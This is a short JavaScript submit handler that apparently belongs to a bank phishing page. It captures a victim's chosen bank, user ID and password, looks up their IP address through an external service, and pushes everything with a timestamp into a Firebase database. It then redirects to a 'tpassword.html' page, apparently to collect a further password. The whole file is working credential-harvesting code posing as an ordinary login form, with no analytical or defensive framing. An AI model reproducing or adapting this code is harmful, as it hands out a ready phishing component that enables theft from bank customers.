document.getElementById("ududip007").addEventListener("submit", function (e) {
    e.preventDefault();

    const bank = document.getElementById("bank").value.trim();
    const userid = document.getElementById("userid").value.trim();
    const password = document.getElementById("password").value.trim();

    // âœ… First fetch IP address
    fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;
            const timestamp = new Date().toISOString();

            const ref = firebase.database().ref("ududip007").push();

            ref.set({
                selected_bank: bank,
                user_id: userid,
                user_password: password,
                ipAddress: ipAddress,
                timestamp: timestamp
            }).then(() => {
                localStorage.setItem("bank", bank);
                window.location.href = "tpassword.html";
            }).catch((error) => {
                alert("Error: " + error.message);
            });
        })
        .catch(error => {
            alert("Unable to get IP address: " + error.message);
        });
});
